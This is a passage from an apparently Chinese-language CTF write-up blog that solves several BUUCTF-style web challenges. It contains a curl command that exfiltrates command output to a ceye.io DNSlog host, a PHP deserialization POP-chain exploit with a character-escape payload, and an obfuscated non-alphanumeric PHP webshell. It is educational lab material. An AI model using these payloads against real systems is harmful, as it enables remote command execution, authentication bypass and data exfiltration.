&quot;&lt;tr&gt;&lt;td&gt;&quot;.$row[&quot;username&quot;].&quot;&lt;&#x2F;td&gt;&lt;td&gt;&quot;.$row[&quot;flag&quot;].&quot;&lt;&#x2F;td&gt;&lt;td&gt;&quot;;            &#125;        &#125;    &#125;&#125;&#x2F;&#x2F; genarate public_keyfunction public_key($length &#x3D; 16) &#123;    $strings1 &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;    $public_key &#x3D; &#39;&#39;;    for ( $i &#x3D; 0; $i &lt; $length; $i++ )        $public_key .&#x3D; substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);    return $public_key;&#125;&#x2F;&#x2F;genarate private_keyfunction private_key($length &#x3D; 12) &#123;    $strings2 &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;    $private_key &#x3D; &#39;&#39;;    for ( $i &#x3D; 0; $i &lt; $length; $i++ )        $private_key .&#x3D; substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);    return $private_key;&#125;$Public_key &#x3D; public_key();&#x2F;&#x2F;$Public_key &#x3D; KVQP0LdJKRaV3n9D  how to get crispr&#39;s private_key???</code></pre><p>给了一个公钥，我们来试试求私钥</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220306160642065.png" alt="image-20220306160642065"></p><p>两个脚本用那个都行，把输出的结果放到php_mt_seed里求求种子</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220306160739487.png" alt="image-20220306160739487"></p><p>得到种子之后就能得到私钥的值了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220306161532376.png" alt="image-20220306161532376"></p><p>对于密码这部分可以直接用万能密码</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220306161615805.png" alt="image-20220306161615805"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220306161558813.png" alt="image-20220306161558813"></p><p>登录拿到flag</p><h2 id="网鼎杯-track-hacker"><a href="#网鼎杯-track-hacker" class="headerlink" title="[网鼎杯]track_hacker"></a>[网鼎杯]track_hacker</h2><p>不是buu的题，也没啥难度，就是记录一下这种解码的方式</p><p>用python2解码</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220313151128218.png" alt="image-20220313151128218"></p><p>如果用python3要用这种写法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220313151354257.png" alt="image-20220313151354257"></p><h2 id="duangShell"><a href="#duangShell" class="headerlink" title="duangShell"></a>duangShell</h2><p>主要是记录一下利用dnslog外带的方法</p><pre class="language-none"><code class="language-none">&lt;!DOCTYPE html&gt;&lt;html lang&#x3D;&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;    &lt;title&gt;give me a girl&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;    &lt;center&gt;&lt;h1&gt;珍爱网&lt;&#x2F;h1&gt;&lt;&#x2F;center&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;&lt;?phperror_reporting(0);echo &quot;how can i give you source code? .swp?!&quot;.&quot;&lt;br&gt;&quot;;if (!isset($_POST[&#39;girl_friend&#39;])) &#123;    die(&quot;where is P3rh4ps&#39;s girl friend ???&quot;);&#125; else &#123;    $girl &#x3D; $_POST[&#39;girl_friend&#39;];    if (preg_match(&#39;&#x2F;\&gt;|\\\&#x2F;&#39;, $girl)) &#123;        die(&#39;just girl&#39;);    &#125; else if (preg_match(&#39;&#x2F;ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$&#x2F;i&#39;, $girl)) &#123;        echo &quot;&lt;img src&#x3D;&#39;img&#x2F;p3_need_beautiful_gf.png&#39;&gt; &lt;!-- He is p3 --&gt;&quot;;    &#125; else &#123;        &#x2F;&#x2F;duangShell~~~~        exec($girl);    &#125;&#125;</code></pre><p>可以看到post的girl_friend值绕过过滤之后直接命令执行，但是这里是exec不存在回显，所以可以进行反弹shell，或者利用dnslog外带命令</p><p><a href="http://ceye.io/">http://ceye.io/</a></p><pre class="language-none"><code class="language-none">curl http:&#x2F;&#x2F;xxx.ceye.io&#x2F;&#96;反引号内执行命令&#96;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220313181954261.png" alt="image-20220313181954261"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220313183153676.png" alt="image-20220313183153676"></p><p>既然能执行命令，那我们就可以用find找flag文件名然后查看，或者直接grep找内容，但是如果从根目录开始找buu的靶机好像跑不动，会显示超时</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220313182203224.png" alt="image-20220313182203224"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220313183232302.png" alt="image-20220313183232302"></p><p>或者用grep直接带出flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220313182614407.png" alt="image-20220313182614407"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220313183120462.png" alt="image-20220313183120462"></p><p>注意的是这种外带一次只能显示一条数据，所以可能会匹配到其他的文件，如果想查看其他数据，就要利用sed命令</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220313182834749.png" alt="image-20220313182834749"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220313183347193.png" alt="image-20220313183347193"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220313182858820.png" alt="image-20220313182858820"></p><p>tips：这种方法可以用于sql盲注，但是前提是必须有FILE权限、secure_file_priv为空而不是NULL（不为空就只能读限定目录的文件）</p><h2 id="GYCTF2020-Easyphp"><a href="#GYCTF2020-Easyphp" class="headerlink" title="[GYCTF2020]Easyphp"></a>[GYCTF2020]Easyphp</h2><p>在update界面，即使没有成功登录也会继续执行下面的调用update方法的语句    </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220317214149049.png" alt="image-20220317214149049"></p><p>重点在lib.php中，这里面有两个__destruct方法，我们要利用的是UpdateHelper类中的__destruct,这是我们反序列化的起点</p><p>但是我们先来看看dbCtrl类</p><pre class="language-none"><code class="language-none">class dbCtrl&#123;    public $hostname&#x3D;&quot;127.0.0.1&quot;;    public $dbuser&#x3D;&quot;root&quot;;    public $dbpass&#x3D;&quot;root&quot;;    public $database&#x3D;&quot;test&quot;;    public $name;    public $password;    public $mysqli;    public $token;    public function __construct()    &#123;        $this-&gt;name&#x3D;$_POST[&#39;username&#39;];        $this-&gt;password&#x3D;$_POST[&#39;password&#39;];        $this-&gt;token&#x3D;$_SESSION[&#39;token&#39;];    &#125;    public function login($sql)    &#123;        $this-&gt;mysqli&#x3D;new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database);        if ($this-&gt;mysqli-&gt;connect_error) &#123;            die(&quot;连接失败，错误:&quot; . $this-&gt;mysqli-&gt;connect_error);        &#125;        $result&#x3D;$this-&gt;mysqli-&gt;prepare($sql);        $result-&gt;bind_param(&#39;s&#39;, $this-&gt;name);        $result-&gt;execute();        $result-&gt;bind_result($idResult, $passwordResult);        $result-&gt;fetch();        $result-&gt;close();        if ($this-&gt;token&#x3D;&#x3D;&#39;admin&#39;) &#123;            return $idResult;        &#125;        if (!$idResult) &#123;            echo(&#39;用户不存在!&#39;);            return false;        &#125;        if (md5($this-&gt;password)!&#x3D;&#x3D;$passwordResult) &#123;            echo(&#39;密码错误！&#39;);            return false;        &#125;        $_SESSION[&#39;token&#39;]&#x3D;$this-&gt;name;        return $idResult;    &#125;    public function update($sql)    &#123;        &#x2F;&#x2F;还没来得及写    &#125;&#125;</code></pre><p>能看出数据库中是存在admin用户的，但是密码我们不知道，这里的sql查询语句为<code>select id,password from user where username=?</code><br>如果能控制这里的sql执行语句为<br><code>select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?</code>便可经过登陆的密码验证，这个操作是可以实现的<br>c4ca4238a0b923820dcc509a6f75849b是1的MD5值</p><p>这是sql创造临时列的一种方法，如果查询的参数不存在，那就会创建一个临时的列，并且设置该列所有参数都是查询的参数。所以整个payload语句的意思就是查询所有数据，然后增加了一个临时列，第一列是数据库中的数据，第二列是添加的临时列1</p><pre class="language-php" data-language="php"><code class="language-php">class User&#123;    public $id;    public $age&#x3D;null;    public $nickname&#x3D;null;    public function login() &#123;        if(isset($_POST[&#39;username&#39;])&amp;&amp;isset($_POST[&#39;password&#39;]))&#123;        $mysqli&#x3D;new dbCtrl();        $this-&gt;id&#x3D;$mysqli-&gt;login(&#39;select id,password from user where username&#x3D;?&#39;);        if($this-&gt;id)&#123;        $_SESSION[&#39;id&#39;]&#x3D;$this-&gt;id;        $_SESSION[&#39;login&#39;]&#x3D;1;        echo &quot;你的ID是&quot;.$_SESSION[&#39;id&#39;];        echo &quot;你好！&quot;.$_SESSION[&#39;token&#39;];        echo &quot;&lt;script&gt;window.location.href&#x3D;&#39;.&#x2F;update.php&#39;&lt;&#x2F;script&gt;&quot;;        return $this-&gt;id;        &#125;    &#125;&#125;    public function update()&#123;        $Info&#x3D;unserialize($this-&gt;getNewinfo());        $age&#x3D;$Info-&gt;age;        $nickname&#x3D;$Info-&gt;nickname;        $updateAction&#x3D;new UpdateHelper($_SESSION[&#39;id&#39;],$Info,&quot;update user SET age&#x3D;$age,nickname&#x3D;$nickname where id&#x3D;&quot;.$_SESSION[&#39;id&#39;]);        &#x2F;&#x2F;这个功能还没有写完 先占坑    &#125;    public function getNewInfo()&#123;        $age&#x3D;$_POST[&#39;age&#39;];        $nickname&#x3D;$_POST[&#39;nickname&#39;];        return safe(serialize(new Info($age,$nickname)));    &#125;    public function __destruct()&#123;        return file_get_contents($this-&gt;nickname);&#x2F;&#x2F;危    &#125;    public function __toString()    &#123;        $this-&gt;nickname-&gt;update($this-&gt;age);&#x2F;&#x2F;这里如果我们将nickname实例化为info类的对象，那么tostring执行的时候就相当于调用一个info类中不存在的方法，也就会调用info类中的__call方法        return &quot;0-0&quot;;    &#125;&#125;class Info&#123;    public $age;    public $nickname;    public $CtrlCase;    public function __construct($age,$nickname)&#123;        $this-&gt;age&#x3D;$age;        $this-&gt;nickname&#x3D;$nickname;    &#125;    public function __call($name,$argument)&#123;        echo $this-&gt;CtrlCase-&gt;login($argument[0]);&#x2F;&#x2F;call方法的两个参数分别是方法名和方法参数，也就是说这个argument就是user类的age属性，是我们可以控制的。然后我们将CtrlCase实例化为dbCtrl类的对象，就能调用dbCtrl类的login方法，再通过控制user类的age，实现对sql语句的控制    &#125;&#125;Class UpdateHelper&#123;    public $id;    public $newinfo;    public $sql;    public function __construct($newInfo,$sql)&#123;        $newInfo&#x3D;unserialize($newInfo);        $upDate&#x3D;new dbCtrl();    &#125;    public function __destruct()    &#123;        echo $this-&gt;sql;&#x2F;&#x2F;将sql实例化为User类的对象，在该类被结束销毁时调用User::__toString方法函数    &#125;&#125;class dbCtrl&#123;    public $hostname&#x3D;&quot;127.0.0.1&quot;;    public $dbuser&#x3D;&quot;root&quot;;    public $dbpass&#x3D;&quot;root&quot;;    public $database&#x3D;&quot;test&quot;;    public $name;    public $password;    public $mysqli;    public $token;    public function __construct()    &#123;        $this-&gt;name&#x3D;$_POST[&#39;username&#39;];        $this-&gt;password&#x3D;$_POST[&#39;password&#39;];        $this-&gt;token&#x3D;$_SESSION[&#39;token&#39;];    &#125;    public function login($sql)    &#123;        $this-&gt;mysqli&#x3D;new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database);        if ($this-&gt;mysqli-&gt;connect_error) &#123;            die(&quot;连接失败，错误:&quot; . $this-&gt;mysqli-&gt;connect_error);        &#125;        $result&#x3D;$this-&gt;mysqli-&gt;prepare($sql);        $result-&gt;bind_param(&#39;s&#39;, $this-&gt;name);        $result-&gt;execute();        $result-&gt;bind_result($idResult, $passwordResult);        $result-&gt;fetch();        $result-&gt;close();        if ($this-&gt;token&#x3D;&#x3D;&#39;admin&#39;) &#123;            return $idResult;        &#125;        if (!$idResult) &#123;            echo(&#39;用户不存在!&#39;);            return false;        &#125;        if (md5($this-&gt;password)!&#x3D;&#x3D;$passwordResult) &#123;            echo(&#39;密码错误！&#39;);            return false;        &#125;        $_SESSION[&#39;token&#39;]&#x3D;$this-&gt;name;        return $idResult;    &#125;    public function update($sql)    &#123;        &#x2F;&#x2F;还没来得及写    &#125;&#125;</code></pre><p>所以pop链为UpdateHelper::__destruct()-&gt;User::__toString-&gt;Info::__call-&gt;dbCtrl::login($sql)</p><p>反序列化脚本为</p><pre class="language-none"><code class="language-none">&lt;?phpclass User&#123;    public $age&#x3D; &#39;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&#39; ;    public $nickname;    public  function __construct()    &#123;        $this -&gt; nickname &#x3D; new Info();    &#125;    public function __toString(): string    &#123;        $this-&gt;nickname-&gt;update($this-&gt;age);        return &quot;0-0&quot;;    &#125;&#125;class Info&#123;    public $age;    public $nickname;    public $CtrlCase;    public function __construct()&#123;        $this-&gt;CtrlCase &#x3D; new dbCtrl();    &#125;    public function __call($name,$argument)&#123;        echo $this-&gt;CtrlCase-&gt;login($argument[0]);    &#125;&#125;Class UpdateHelper&#123;    public $sql;    public function __construct()&#123;        $this -&gt;sql &#x3D; new User();    &#125;    public function __destruct()    &#123;        echo $this-&gt;sql;    &#125;&#125;class dbCtrl&#123;    public function __construct()    &#123;        $this-&gt;name&#x3D;&#39;admin&#39;;        $this-&gt;password&#x3D;&#39;1&#39;;    &#125;    public function login($sql)    &#123;    &#125;&#125;$a &#x3D; new UpdateHelper();echo serialize($a);&#x2F;&#x2F;&#x2F;&#x2F;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;</code></pre><p>正常情况下的序列化内容</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220317213027089.png" alt="image-20220317213027089"></p><p>我们要把我们的序列化结果插入到2的位置</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220317213946058.png" alt="image-20220317213946058"></p><p>可以看到插入后他只能被作为nickname的值，所以我们就要利用反序列化的字符逃逸，利用safe函数中将union替换为六个字母的hacker实现逃逸，两个箭头之内的值的数量就是我们要添加的union的值</p><p>payload:</p><pre class="language-none"><code class="language-none">age&#x3D;1&amp;nickname&#x3D;unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;&#125;</code></pre><p>然后用户名为admin，密码为1登录即可</p><h2 id="SUCTF-2018-GetShell"><a href="#SUCTF-2018-GetShell" class="headerlink" title="[SUCTF 2018]GetShell"></a>[SUCTF 2018]GetShell</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220406143553884.png" alt="image-20220406143553884"></p><p>很明显是传个一句话上去，但是他会对文件内容从第六位开始进行黑名单检测，用bp简单fuzz一下</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220406143904075.png" alt="image-20220406143904075"></p><p>括号还有取反符号都没被过滤，参考一下p牛的文章</p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html?page=2#reply-list">一些不包含数字和字母的webshell | 离别歌 (leavesongs.com)</a></p><p><strong>方法一</strong></p><p>在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。</p><p><strong>方法二</strong></p><p>和方法一有异曲同工之妙，唯一差异就是，方法一使用的是位运算里的“异或”，方法二使用的是位运算里的“取反”。</p><p>方法二利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如<code>&#39;和&#39;&#123;2&#125;</code>的结果是<code>&quot;\x8c&quot;</code>，其取反即为字母<code>s</code>：</p><p><strong>方法三</strong></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220406144305986.png" alt="image-20220406144305986"></p><pre class="language-none"><code class="language-none">&lt;?php$_&#x3D;[];$_&#x3D;@&quot;$_&quot;; &#x2F;&#x2F; $_&#x3D;&#39;Array&#39;;$_&#x3D;$_[&#39;!&#39;&#x3D;&#x3D;&#39;@&#39;]; &#x2F;&#x2F; $_&#x3D;$_[0];$___&#x3D;$_; &#x2F;&#x2F; A$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.&#x3D;$__; &#x2F;&#x2F; S$___.&#x3D;$__; &#x2F;&#x2F; S$__&#x3D;$_;$__++;$__++;$__++;$__++; &#x2F;&#x2F; E $___.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; R$___.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; T$___.&#x3D;$__;$____&#x3D;&#39;_&#39;;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; P$____.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; O$____.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; S$____.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; T$____.&#x3D;$__;$_&#x3D;$$____;$___($_[_]); &#x2F;&#x2F; ASSERT($_POST[_]);</code></pre><p>这题里取反符号没被过滤，那我们就用第二种方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220406151728717.png" alt="image-20220406151728717"></p><p>可以看到我们可以利用数组的方式从汉字的取反值里读出一个字母</p><p>找篇p牛的文章跑一下</p><pre class="language-none"><code class="language-none">&lt;?php$dome &#x3D; &#39;当我站在山顶上俯瞰半个鼓浪屿和整个厦门的夜空的时候，我知道此次出行的目的已经完成了，我要开始收拾行李，明天早上离开这里。前几天有人问我，大学四年结束了，你也不说点什么？乌云发生了一些事情，所有人都缄默不言，你也是一样吗？你逃到南方，难道不回家了吗？当然要回家，我只是想找到我要找的答案。其实这次出来一趟很累，晚上几乎是热汗淋漓回到住处，厦门的海风伴着妮妲路过后带来的淅淅沥沥的小雨，也去不走我身上任何一个毛孔里的热气。好在旅社的生活用品一应俱全，洗完澡后我爬到屋顶。旅社是一个老别墅，说起来也不算老，比起隔壁一家旧中国时期的房子要豪华得多，竖立在笔山顶上与厦门岛隔海相望。站在屋顶向下看，灯火阑珊的鼓浪屿街市参杂在绿树与楼宇间，依稀还可以看到熙熙攘攘的游客。大概是夜晚渐深的缘故，周围慢慢变得宁静下来，我忘记白天在奔波什么，直到站在这里的时候，我才知道我寻找的答案并不在南方。当然也不在北方，北京的很多东西让我非常丧气，包括自掘坟墓的中介和颐指气使的大人们；北京也有很多东西让我喜欢，我喜欢颐和园古色古香的玉澜堂，我喜欢朝阳门那块“永延帝祚”的牌坊，喜欢北京鳞次栉比的老宅子和南锣鼓巷的小吃。但这些都不是我要的答案，我也不知道我追随的是什么，但想想百年后留下的又是什么，想想就很可怕。我曾经为了吃一碗臭豆腐，坐着优步从上地到北海北，兴冲冲地来到那个垂涎已久的豆腐摊前，用急切又害羞的口吻对老板说，来两份量的臭豆腐。其实也只要10块钱，吃完以后便是无与伦比的满足感。我记得那是毕业设计审核前夕的一个午后，五月的北京还不算炎热，和煦的阳光顺着路边老房子的屋檐洒向大地，但我还是不敢站在阳光下，春天的燥热难耐也绝不输给夏天。就像很多人冷嘲热讽的那样，做这一行谁敢把自己完全曝光，甭管你是黑帽子白帽子还是绿帽子。生活在那个时候还算美好，我依旧是一个学生，几天前辞别的同伴还在朝九晚五的工作，一切都照旧运行，波澜不惊。远走千里吃豆腐这种理想主义的事情这几年在我身上屡屡发生，甚至南下此行也不例外。一年前的这个时候我许过一个心愿，在南普陀，我特为此来还愿。理想化、单纯与恋旧，其中单纯可不是一个多么令人称赞的形容，很多人把他和傻挂钩。“你太单纯了，你还想着这一切会好起来”，对呀，在男欢女爱那些事情上，我可不单纯，但有些能让人变得圆滑与世故的抉择中，我宁愿想的更单纯一些。去年冬天孤身一人来到北京，放弃了在腾讯做一个安逸的实习生的机会，原因有很多也很难说。在腾讯短暂的实习生活让我记忆犹新，我感觉这辈子不会再像一个小孩一样被所有人宠了，这些当我选择北漂的时候应该就要想到的。北京的冬天刺骨的寒冷，特别是2015年的腊月，有几天连续下着暴雪，路上的积雪一踩半步深，咯吱咯吱响，周遭却静的像深山里的古刹。我住的小区离公司有一段距离，才下雪的那天我甚至还走着回家。北京的冬天最可怕的是寒风，走到家里耳朵已经硬邦邦好像一碰就会碎，在我一头扎进被窝里的时候，我却慢慢喜欢上这个古都了。我想到《雍正皇帝》里胤禛在北京的鹅毛大雪里放出十三爷，那个拼命十三郎带着令牌取下丰台大营的兵权，保了大清江山盛世的延续与稳固。那一夜，北京的漫天大雪绝不逊于今日，而昔人已作古，来者尚不能及，多么悲哀。这个古都承载着太多历史的厚重感，特别是下雪的季节，我可以想到乾清宫前广场上千百年寂寞的雕龙与铜龟，屋檐上的积雪，高高在上的鸱吻，想到数百年的沧桑与朝代更迭。雪停的那天我去了颐和园，我记得我等了很久才摇摇摆摆来了一辆公交车，车上几乎没有人，司机小心翼翼地转动着方向盘，在湿滑的道路上缓慢前行。窗外白茫茫一片，阳光照在雪地上有些刺眼，我才低下头。颐和园的学生票甚至比地铁票还便宜。在昆明湖畔眺望湖面，微微泛着夕阳霞光的湖水尚未结冰，踩着那些可能被御碾轧过的土地，滑了无数跤，最后只能扶着湖边的石狮子叹气，为什么没穿防滑的鞋子。昆明湖这一汪清水，见证了光绪皇帝被囚禁十载的蹉跎岁月，见证了静安先生誓为先朝而自溺，也见证了共和国以来固守与开放的交叠。说起来，家里有本卫琪著的《人间词话典评》，本想买来瞻仰一下王静安的这篇古典美学巨著，没想到全书多是以批判为主。我自诩想当文人的黑客，其实也只是嘴里说说，真到评说文章是非的时候，我却张口无词。倒是誓死不去发，这点确实让我无限感慨：中国士大夫的骨气，真的是从屈原投水的那一刻就奠定下来的。有句话说，古往今来中国三大天才死于水，其一屈原，其二李白，其三王国维。卫琪对此话颇有不服，不纠结王国维是否能够与前二者相提并论，我单喜欢他的直白，能畅快评说古今词话的人，也许无出其右了吧。人言可畏、人言可畏，越到现代越会深深感觉到这句话的正确，看到很多事情的发展往往被舆论所左右，就越羡慕那些无所畏惧的人，不论他们是勇敢还是自负。此间人王垠算一个，网络上人们对他毁誉参半，但确实有本事而又不矫揉做作，放胆直言心比天高的只有他一个了。那天在昆明湖畔看过夕阳，直到天空变的无比深邃，我才慢慢往家的方向走。耳机放着后弦的《昆明湖》，不知不觉已经十年了，不知道这时候他有没有回首望望自己的九公主和安娜，是否还能够“泼墨造一匹快马，追回十年前姑娘”。后来，感觉一切都步入正轨，学位证也顺利拿到，我匆匆告别了自己的大学。后来也遇到了很多事，事后有人找我，很多人关心你，少数人可能不是，但出了学校以后，又有多少人和事情完全没有目的呢？我也考虑了很多去处，但一直没有决断，倒有念怀旧主，也有妄自菲薄之意，我希望自己能做出点成绩再去谈其他的，所以很久都是闭门不出，琢磨东西。来到厦门，我还了一个愿，又许了新的愿望，希望我还会再次来还愿。我又来到了上次没住够的鼓浪屿，订了一间安静的房子，只有我一个人。在这里，能听到的只有远处屋檐下鸟儿叽叽喳喳的鸣叫声，远处的喧嚣早已烟消云散，即使这只是暂时的。站在屋顶的我，喝下杯中最后一口水。清晨，背着行李，我乘轮渡离开了鼓浪屿，这是我第二次来鼓浪屿，谁知道会不会是最后一次。我在这里住了三天，用三天去寻找了一个答案。不知不觉我又想到辜鸿铭与沈子培的那段对话。“大难临头，何以为之？”“世受国恩，死生系之。”&#39;;for($i &#x3D;0 ; $i &lt; 1000 ; $i++)&#123;    $sub_str &#x3D; mb_substr($dome, $i, 1);    echo $sub_str.&#39;&#x3D;&#39;.~($sub_str)[1];    echo &quot;\r\n&quot;;&#125;</code></pre><p>我们想构造system（这里不构造eval的原因是<strong>eval 属于PHP语法构造的一部分，并不是一个函数，所以不能通过 变量函数 的形式来调用（虽然它确实像极了函数原型）。</strong>这样的语法构造还包括：echo，print，unset()，isset()，empty()，include，require，..</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220406154353685.png" alt="image-20220406154353685"></p><p>然后把我们想要的字母找出来</p><pre class="language-none"><code class="language-none">北&#x3D;s冲&#x3D;y北&#x3D;s择&#x3D;t的&#x3D;e和&#x3D;m说&#x3D;P小&#x3D;O笔&#x3D;S站&#x3D;T</code></pre><p>好了，但是1是数字，显然不能直接用，所以还要尝试利用php的特性获得1</p><p><img 